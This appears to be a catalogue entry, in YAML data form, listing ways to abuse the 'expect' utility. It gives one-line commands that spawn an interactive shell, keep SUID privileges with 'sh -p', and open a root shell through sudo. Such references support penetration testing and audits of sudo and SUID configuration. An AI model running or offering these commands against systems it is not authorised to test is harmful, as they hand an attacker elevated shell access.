---
functions:
  shell:
    - code: expect -c 'spawn /bin/sh;interact'
  suid:
    - code: ./expect -c 'spawn /bin/sh -p;interact'
  sudo:
    - code: sudo expect -c 'spawn /bin/sh;interact'
---
